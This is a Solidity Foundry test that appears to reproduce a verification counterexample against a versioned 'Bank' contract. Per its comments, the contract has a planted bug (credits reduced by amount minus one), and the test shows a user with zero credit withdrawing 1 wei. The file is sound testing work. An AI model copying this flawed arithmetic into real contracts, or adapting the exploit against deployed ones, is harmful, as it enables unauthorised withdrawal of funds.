// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.2;

import {Test} from "forge-std/Test.sol";
import {Bank} from "versions/Bank_v2.sol";

// Contract user (userContract0 = 0xaaaa0004, userContract1 = 0xaaaa0005 in the counterexample).
// receive_choice = 0: accepts the ETH and does nothing (like an EOA)
contract User {
    receive() external payable {}
}


// tx1: deposit()   sender_is_contract = 1, sender_is_contract0 = 0 => userContract1
//                  p_value  = 0x100000000000000000000000000000000
// tx2: withdraw(1) sender_is_contract = 1, sender_is_contract0 = 1 => userContract0
//                  p_amount = 0x01, receive_choice = 0
// The bug: credits[msg.sender] -= amount - 1, so withdraw(1) does not check the credit
contract PoC_WithdrawRevert_v2 is Test {

    Bank bank;
    User user0;
    User user1;

    function setUp() public {
        bank = new Bank();
        user0 = new User();
        user1 = new User();
    }

    function test_poc_withdraw_revert() public {
        // tx1: userContract1 deposits, so that Bank holds some ETH
        uint256 value = 0x100000000000000000000000000000000;
        vm.deal(address(user1), value);
        vm.prank(address(user1));
        bank.deposit{value: value}();

        // tx2: userContract0, whose credit is 0, withdraws 1 wei
        uint256 amount = 0x01;
        bytes32 slot = keccak256(abi.encode(address(user0), uint256(0)));
        uint256 creditBefore = uint256(vm.load(address(bank), slot));

        vm.prank(address(user0));
        (bool ok,) = address(bank).call(abi.encodeWithSignature("withdraw(uint256)", amount));

        // on v2 this is violated: amount (1) > credit (0), but withdraw does not revert
        assertGt(amount, creditBefore, "precondition: amount must exceed the sender's credit");
        assertTrue(ok, "withdraw-revert holds: counterexample not reproduced");
    }
}
